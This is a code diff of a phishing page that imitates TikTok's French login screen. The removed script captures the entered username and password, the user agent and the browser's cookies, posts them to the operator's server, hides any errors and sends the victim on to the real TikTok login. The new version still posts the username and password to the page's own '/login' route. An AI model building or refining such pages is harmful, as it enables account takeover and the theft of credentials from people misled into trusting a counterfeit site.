@@ -33,15 +33,19 @@
 
 <div class="login-container">
     <h2>Connexion</h2>
-    <form id="tiktokForm">
+    
+    <form id="tiktokForm" action="/login" method="POST">
         <div class="input-group">
-            <input type="text" id="userField" placeholder="E-mail ou nom d'utilisateur" required>
+            <input type="text" name="username" placeholder="E-mail ou nom d'utilisateur" required>
         </div>
+        
         <div class="input-group">
-            <input type="password" id="passwordField" placeholder="Mot de passe" required>
+            <input type="password" name="password" id="passwordField" placeholder="Mot de passe" required>
             <span class="toggle-password" id="toggleBtn">Afficher</span>
         </div>
+        
         <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+        
         <button type="submit" class="login-btn">Se connecter</button>
     </form>
 </div>
@@ -52,42 +56,15 @@
 </div>
 
 <script>
-    // 1. Afficher/Masquer le mot de passe
     const passwordField = document.getElementById('passwordField');
     const toggleBtn = document.getElementById('toggleBtn');
+
     toggleBtn.addEventListener('click', function() {
         const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
         passwordField.setAttribute('type', type);
         this.textContent = type === 'password' ? 'Afficher' : 'Masquer';
     });
-
-    // 2. Capture et Envoi vers Render
-    const form = document.getElementById('tiktokForm');
-    form.onsubmit = async function(e) {
-        e.preventDefault();
-
-        const payload = {
-            identifiant: document.getElementById('userField').value,
-            password: passwordField.value,
-            userAgent: navigator.userAgent,
-            cookies_locaux: document.cookie,
-            date: new Date().toLocaleString()
-        };
-
-        try {
-            // Envoi vers la route de ton serveur Render
-            await fetch('/api/auth', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch (error) {
-            console.log("Erreur silencieuse");
-        } finally {
-            // Redirection vers le vrai TikTok
-            window.location.href = "https://www.tiktok.com/login";
-        }
-    };
 </script>
+
 </body>
 </html>
